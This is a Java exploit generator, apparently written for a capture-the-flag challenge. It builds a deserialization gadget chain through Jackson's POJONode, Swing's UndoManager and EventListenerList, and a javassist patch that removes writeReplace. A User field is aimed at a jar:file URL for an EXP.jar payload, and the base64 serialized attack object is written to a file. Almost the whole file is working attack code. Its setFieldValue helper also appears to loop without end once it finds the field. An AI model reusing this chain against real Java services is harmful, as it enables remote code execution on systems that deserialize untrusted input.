import com.example.ycbjava.bean.User;
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.*;
import org.springframework.aop.framework.AdvisedSupport;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.Map;
import java.util.Vector;

public class EventGadget {
    public static void main(String[] args) throws Exception {
        User user = new User();
        user.setGift("jar:file://D:\\tmp\\EXP.jar!\\");

        // 删除 BaseJsonNode#writeReplace 方法用于顺利序列化
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();


        POJONode node = new POJONode((user));

        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) getFieldValue(manager, "edits");
        vector.add(node);
        setFieldValue(list, "listenerList", new Object[] { Map.class, manager });

//        node.toString();

        byte[] serialize = serialize(node);
        String s = Base64.getEncoder().encodeToString(serialize);
        FileOutputStream fos = new FileOutputStream(new File("D:\\tmp\\payload.txt"));
        fos.write(s.getBytes());
        fos.close();

//        EXP exp = new EXP();
//        byte[] serialize1 = serialize(exp);
//        String s1 = Base64.getEncoder().encodeToString(serialize1);
//        FileOutputStream fileOutputStream = new FileOutputStream(new File("D:\\tmp\\calc.txt"));
//        fileOutputStream.write(s1.getBytes());
//        fileOutputStream.close();

//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serialize);
//        new ObjectInputStream(byteArrayInputStream).readObject();


    }

    public static Object makeTemplatesImplAopProxy(User user) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(user);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{User.class}, handler);
        return proxy;
    }

    public static byte[] serialize(Object o) throws NoSuchFieldException, IllegalAccessException, IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
        oos.writeObject(o);
        oos.close();
        return byteArrayOutputStream.toByteArray();
    }

    //bin文件反序列化
    public static void deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(new File("ser.bin"));
        ObjectInputStream objectInputStream = new ObjectInputStream(fis);
        objectInputStream.readObject();
    }

    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        Class<?> aClass = obj.getClass();
        Field field1 = null;
        while (aClass != null) {
            try {
                field1 = aClass.getDeclaredField(field);
            }catch (NoSuchFieldException e) {
                aClass = aClass.getSuperclass();
            }
        }
        field1.setAccessible(true);
        field1.set(obj, val);
    }

    public static Object getFieldValue(Object obj, String field) throws Exception{
        Class clazz = obj.getClass();

        while (clazz != null) {
            try {
                Field fieldName = clazz.getDeclaredField(field);
                fieldName.setAccessible(true);

                return fieldName.get(obj);
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }

        return null;
    }
}
